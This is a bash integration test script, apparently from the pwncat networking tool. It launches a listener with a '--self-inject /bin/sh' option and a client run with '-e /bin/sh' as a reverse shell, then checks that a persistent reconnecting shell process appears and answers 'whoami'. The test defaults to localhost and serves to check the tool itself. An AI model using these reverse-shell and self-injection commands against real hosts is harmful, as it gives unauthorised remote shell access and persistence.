#!/usr/bin/env bash

set -e
set -u
set -o pipefail

SCRIPTPATH="$( cd "$(dirname "$0")" >/dev/null 2>&1 ; pwd -P )"
SOURCEPATH="${SCRIPTPATH}/../../.lib/conf.sh"
BINARY="${SCRIPTPATH}/../../../bin/pwncat"
# shellcheck disable=SC1090
source "${SOURCEPATH}"


# -------------------------------------------------------------------------------------------------
# GLOBALS
# -------------------------------------------------------------------------------------------------

RHOST="${1:-localhost}"
RPORT="${2:-4444}"

STARTUP_WAIT="${3:-4}"
RUNS="${4:-1}"

PYTHON="python${5:-}"
PYVER="$( "${PYTHON}" -V 2>&1 | head -1 || true )"


# -------------------------------------------------------------------------------------------------
# TEST FUNCTIONS
# -------------------------------------------------------------------------------------------------
print_test_case "${PYVER}"

run_test() {
	local srv_opts="${1// / }"
	local cli_opts="${2// / }"
	local curr_mutation="${3}"
	local total_mutation="${4}"
	local curr_round="${5}"
	local total_round="${6}"
	#local data=
	#local data_or=

	print_h1 "[ROUND: ${curr_round}/${total_round}] (mutation: ${curr_mutation}/${total_mutation}) Starting Test Round (srv '${srv_opts}' vs cli '${cli_opts}')"
	run "sleep 1"

	###
	### Create data and files
	###
	data="whoami\\n"
	expect="$(whoami)\\n"
	expect_or="$(whoami)\\r\\n"
	srv_stdout="$(tmp_file)"
	srv_stderr="$(tmp_file)"
	cli_stdout="$(tmp_file)"
	cli_stderr="$(tmp_file)"
	srv2_stdout="$(tmp_file)"
	srv2_stderr="$(tmp_file)"


	# --------------------------------------------------------------------------------
	# START: SERVER
	# --------------------------------------------------------------------------------
	print_h2 "(1/9) Start: PwncatInjectListener"

	# Start Server
	print_info "Start PwncatInjectListener"
	# shellcheck disable=SC2086
	if ! srv_pid="$( run_bg "" "${PYTHON}" "${BINARY}" ${srv_opts} "${srv_stdout}" "${srv_stderr}" )"; then
		printf ""
	fi

	# Wait until Server is up
	run "sleep ${STARTUP_WAIT}"

	# [SERVER] Ensure Server is running
	test_case_instance_is_running "PwncatInjectListener" "${srv_pid}" "${srv_stdout}" "${srv_stderr}"

	# [SERVER] Ensure Server has no errors
	test_case_instance_has_no_errors "PwncatInjectListener" "${srv_pid}" "${srv_stdout}" "${srv_stderr}"


	# --------------------------------------------------------------------------------
	# START: CLIENT
	# --------------------------------------------------------------------------------
	print_h2 "(2/9) Start: RevShell"

	# Start Client
	print_info "Start RevShell"
	# shellcheck disable=SC2086
	if ! cli_pid="$( run_bg "" "${PYTHON}" "${BINARY}" ${cli_opts} "${cli_stdout}" "${cli_stderr}" )"; then
		printf ""
	fi

	# Wait until Client is done
	run "sleep ${STARTUP_WAIT}"

	# [SERVER] Ensure Client has no errors
	test_case_instance_has_no_errors "RevShell" "${cli_pid}" "${cli_stdout}" "${cli_stderr}"

	# --------------------------------------------------------------------------------
	# TEST: Inject shell is running
	# --------------------------------------------------------------------------------
	print_h2 "(3/9) Test: Inject shell is running"
	CURR=0
	TRIES=60
	# shellcheck disable=SC2009
	while [ "$(ps auxw | grep -v grep | grep reconn-wait | awk '{print $2}' | wc -l)" -ne "1" ]; do
		printf "."
		sleep 1
		CURR=$(( CURR + 1 ))
		if [ "${CURR}" -gt "${TRIES}" ]; then
			kill_pid "${srv_pid}" || true
			kill_pid "${cli_pid}" || true
			print_file "PwncatInjectListener] - [/dev/stderr" "${srv_stderr}"
			print_file "PwncatInjectListener] - [/dev/stdout" "${srv_stdout}"
			print_file "RevShell] - [/dev/stderr" "${cli_stderr}"
			print_file "RevShell] - [/dev/stdout" "${cli_stdout}"
			FILES="$(grep 'tmpfile:' "${srv_stdout}" | sed 's/.*tmpfile: //g' | awk -F"'" '{print $2}')"
			echo "${FILES}"| while read -r line; do
				echo "${line}"
				print_file "Remote tmpfile" "${line}" || true
			done
			print_error "Inject shell is not running"
			run "ps"
			run "ps -a" || true
			run "ps -au" || true
			run "ps -aux" || true
			run "ps a" || true
			run "ps au" || true
			run "ps aux" || true
			run "ps -ef" || true
			exit 1
		fi
	done


	# --------------------------------------------------------------------------------
	# TEST: Client shut down automatically
	# --------------------------------------------------------------------------------
	print_h2 "(4/9) Test: RevShell shut down automatically"

	## Give some time for shutdown
	#run "sleep 10"

	## [CLIENT] Manually stop the Client
	#test_case_instance_is_stopped "RevShell" "${cli_pid}" "${cli_stdout}" "${cli_stderr}" "PwncatInjectListener" "${srv_pid}" "${srv_stdout}" "${srv_stderr}"

	## [CLIENT] Ensure Client still has no errors
	#test_case_instance_has_no_errors "RevShell" "${cli_pid}" "${cli_stdout}" "${cli_stderr}" "PwncatInjectListener" "${srv_pid}" "${srv_stdout}" "${srv_stderr}" "(Connection refused)|(actively refused)|(timed out)"
	run "kill ${cli_pid}" || true


	# --------------------------------------------------------------------------------
	# TEST: Server shut down automatically
	# --------------------------------------------------------------------------------
	print_h2 "(5/9) Test: PwncatInjectListener shut down automatically"

	## Give some time for shutdown
	#run "sleep 10"

	## [SERVER] Ensure Server has quit automatically
	#test_case_instance_is_stopped "PwncatInjectListener" "${srv_pid}" "${srv_stdout}" "${srv_stderr}" "RevShell" "${cli_pid}" "${cli_stdout}" "${cli_stderr}"

	## [SERVER] Ensure Server still has no errors
	#test_case_instance_has_no_errors "PwncatInjectListener" "${srv_pid}" "${srv_stdout}" "${srv_stderr}" "RevShell" "${cli_pid}" "${cli_stdout}" "${cli_stderr}"
	run "kill ${srv_pid}" || true


	# --------------------------------------------------------------------------------
	# START: SERVER
	# --------------------------------------------------------------------------------
	print_h2 "(6/9) Start: FinalListener"

	# Start Server
	run "sleep 5"
	print_info "Start FinalListener"
	# shellcheck disable=SC2086
	if ! srv_pid="$( run_bg "printf ${data}" "${PYTHON}" "${BINARY}" -l ${RPORT} -vvvv "${srv2_stdout}" "${srv2_stderr}" )"; then
		printf ""
	fi


	# --------------------------------------------------------------------------------
	# DATA TRANSFER
	# --------------------------------------------------------------------------------
	print_h2 "(7/9) Transfer: FinalListener -> Pwncat -> FinalListener"

	# [CLIENT -> SERVER -> CLIENT]
	wait_for_data_transferred "" "${expect}" "${expect_or}" "FinalListener" "${srv_pid}" "${srv2_stdout}" "${srv2_stderr}"


	# --------------------------------------------------------------------------------
	# TEST: Server shut down automatically
	# --------------------------------------------------------------------------------
	print_h2 "(8/9) Test: FinalListener shut down automatically"

	## Give some time for shutdown
	#run "sleep 10"

	## [SERVER] Ensure Server has quit automatically
	#test_case_instance_is_stopped "FinalListener" "${srv_pid}" "${srv2_stdout}" "${srv_stderr}"

	## [SERVER] Ensure Server has no errors
	#test_case_instance_has_no_errors "FinalListener" "${srv_pid}" "${srv2_stdout}" "${srv2_stderr}"
	run "kill ${srv_pid}" || true


	# --------------------------------------------------------------------------------
	# CLEANUP
	# --------------------------------------------------------------------------------
	print_h2 "(9/9) Cleanup"

	run "ps auxw | grep -v grep | grep reconn-wait | awk '{print \$2}' | xargs kill" || true

	print_file "PwncatInjectListener] - [/dev/stdout" "${srv_stdout}"
}


# -------------------------------------------------------------------------------------------------
# MAIN ENTRYPOINT
# -------------------------------------------------------------------------------------------------

for curr_round in $(seq "${RUNS}"); do
	#         PwncatInjectListener opts                                      RevShell opts
	# BIND ON ANY
	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}    -vvvv" "${RHOST} ${RPORT} -e /bin/sh    -vvvv"  "1" "1" "${curr_round}" "${RUNS}"
done
